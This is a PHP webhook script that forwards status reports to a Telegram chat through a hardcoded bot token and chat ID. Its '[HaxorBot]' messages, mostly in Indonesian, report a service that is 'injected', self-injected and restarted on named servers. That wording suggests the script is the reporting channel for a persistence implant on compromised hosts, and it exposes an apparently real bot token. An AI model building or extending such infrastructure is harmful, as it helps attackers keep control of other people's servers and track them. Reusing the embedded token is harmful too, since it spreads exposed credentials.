<?php

// Replace with your Telegram Bot API token
$telegram_bot_token = '7687933559:AAHJUCGKVyXfDD9A4YzTcj74OI5Q4tTLsuM';
// Replace with your Telegram chat ID
$chat_id = '-1002250420519';

function send_telegram_notification($message) {
    global $telegram_bot_token, $chat_id;

    // Prepare data for the Telegram API
    $url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message
    ];

    // Send the message using cURL
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true
    ];

    $ch = curl_init();
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);

    if ($result === FALSE) {
        error_log('Failed to send Telegram notification.');
    }
}

parse_str(file_get_contents("php://input"), $post_data);

if (isset($post_data['status']) && isset($post_data['host'])) {
    $status = $post_data['status'];
    $host = $post_data['host'];

    if ($status === 'service_down') {
        send_telegram_notification("[HaxorBot] Service tidak berjalan di server $host, mengaktifkan ulang...");
    } elseif ($status === 'service_up') {
        send_telegram_notification("[HaxorBot] Berhasil mengaktifkan ulang service di server $host!");
    } elseif ($status === 'service_fail') {
        send_telegram_notification("[HaxorBot] Gagal mengaktifkan ulang service di server $host!");
    } elseif ($status === 'service_injected') {
        send_telegram_notification("[HaxorBot] Self Injected: Service is running and status is healthy on $host.");
    } elseif ($status === 'service_already_injected') {
        send_telegram_notification("[HaxorBot] Service sudah terinjeksi dan berjalan dengan baik di server $host.");
    } else {
        send_telegram_notification("[HaxorBot] Status tidak dikenali di server $host.");
    }
} else {
    send_telegram_notification("[HaxorBot] Status atau host tidak dikirim.");
}
?>
